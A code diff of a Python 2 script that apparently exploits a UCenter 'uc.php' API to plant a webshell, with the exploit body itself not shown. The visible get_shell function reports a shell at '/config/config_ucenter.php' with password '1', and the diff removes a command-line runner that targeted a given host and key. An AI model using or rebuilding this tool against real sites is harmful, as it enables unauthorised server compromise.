@@ -1,34 +1,23 @@
 #!/usr/bin/env python
 # encoding: utf-8
-# encoding: utf-8
 import os
-from pymongo import MongoClient
 import re
 import requests
 import sys
 import random
 import string
-from PIL import Image
-
-from multiprocessing import Queue
-from multiprocessing import Pool
-
-import gevent
-from gevent import monkey
-monkey.patch_socket()
-from gevent.pool import Pool
-
 import hashlib
 import time
 import math
 import base64
 import urllib
-import urllib2
 import sys
 
 from optparse import OptionParser 
 from optparse import OptionGroup
 from optparse import OptionError
+
+from thread_template import runThreads
 
 
 def microtime(get_as_float = False) :
@@ -108,13 +97,6 @@ def get_shell(url,key,host):
     return "webshell:"+host+"/config/config_ucenter.php,password:1"
 
 
-def execute():
-
-    host=sys.argv[1]
-    key=sys.argv[2]
-    url=host+"/api/uc.php"
-    print get_shell(url,key,host)
-
 
 def test():
 
@@ -132,20 +114,18 @@ def test():
 
 
 def test2():
-    import uu
-
-    data = open('tmp', 'rb')
-    out_file = open('out', 'wb')
-    print uu.decode(data, out_file, mode='wb')
+    return [1, 2, 3, 4]
+    # for i in range(10):
+        # response = requests.get('http://www.baidu.com')
+        # print (response.status_code)
     
-
 def main():
-    test2()
+    a = test2()
+    print (type(a))
+    # runThreads(5, test2)
 
 
 if __name__ == '__main__':
-    # os.system('clear')
+    os.system('clear')
 
     main()
-
-
